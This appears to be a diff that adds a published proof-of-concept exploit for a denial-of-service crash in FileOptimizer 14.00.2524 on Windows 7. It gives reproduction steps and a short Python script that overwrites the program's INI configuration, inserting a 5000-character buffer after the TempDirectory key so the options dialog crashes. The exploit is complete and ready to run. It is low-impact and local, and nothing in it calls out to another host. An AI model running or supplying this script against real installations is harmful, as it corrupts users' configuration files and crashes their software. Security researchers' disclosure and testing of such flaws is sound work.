@@ -1,0 +1,29 @@
+# Exploit Title:  FileOptimizer 14.00.2524 - Denial of Service (PoC)
+# Date: 2019-11-04
+# Exploit Author: Chase Hatch (SYANiDE)
+# Vendor Homepage: https://sourceforge.net/projects/nikkhokkho/
+# Software Link: https://sourceforge.net/projects/nikkhokkho/files/FileOptimizer/14.00.2524/FileOptimizerSetup.exe/download
+# Version: 14.00.2524
+# Tested on: Windows 7 Ultimate x86 SP0
+# CVE : none
+
+## Steps to reproduce
+## Open application for the first time so it generates "FileOptimizer32.ini" in the install directory
+## Run the PoC
+## Open FileOptimizer again, navigating to "Optimize" / "Options".
+## Click OK to crash
+
+#! /usr/bin/env python
+import os, sys, re
+
+test="TempDirectory="  # variable/str in config file to replace with buffer
+dir = "C:\\Program Files\\FileOptimizer\\"
+file = "FileOptimizer32.ini"
+
+sploit = "A"*5000
+
+temp = open(dir+file,'r').read()
+temp2 = re.sub(test, test + sploit, temp) 
+with open(dir+file,'w') as F:
+    F.write(temp2)
+    F.close()
